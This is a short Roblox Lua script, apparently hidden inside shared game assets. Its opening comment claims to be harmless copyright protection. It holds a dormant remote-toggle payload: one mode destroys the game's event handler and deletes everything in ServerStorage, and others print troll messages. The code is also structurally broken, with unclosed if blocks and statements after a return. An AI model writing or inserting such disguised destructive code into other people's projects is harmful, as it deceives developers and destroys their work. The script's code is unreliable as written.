--[[
     Hi game dev, if you found this script it means there are reader(s) in your game!
     No worries as they are harmless and default mode is (0) which is NOTHING!
     If this is found just ignore it, its used for copyright aka fair asset usage.
]]


-- 0 = nothing          [best]
-- 1 = disables game    [worst]
-- 2 = idk just a troll [?]
-- 3 = prints ur msg    [?]



local set = false
local val = 0 -- only activated if david does something bad
local warning = "hi"

if not set then 
    if val == 0 then
      return
    if val == 1 then
      while wait(0) do
      local efolder = game.Workspace:FindFirstChild("Events")
       if efolder then
            local handler = efolder:FindFirstChild("Handler")
              if handler then
                  handler:Destroy()
              end
        local wmsg = Instance.new("StringValue")
        wmsg.Name = "Warning"
        wmsg.Value = "Script deleted due to unfair usage, games serverstorage has been cleared."
        wmsg.Parent = efolder
    end
        
    for _, item in pairs(game.ServerStorage:GetChildren()) do
      item:Destroy()
      print("[DEBUG]: Game disabled from running!")
    end
end

    if val == 2 then
          print("hi im a sigma!")
      end
if val == 3 then
          print(warning)
   end
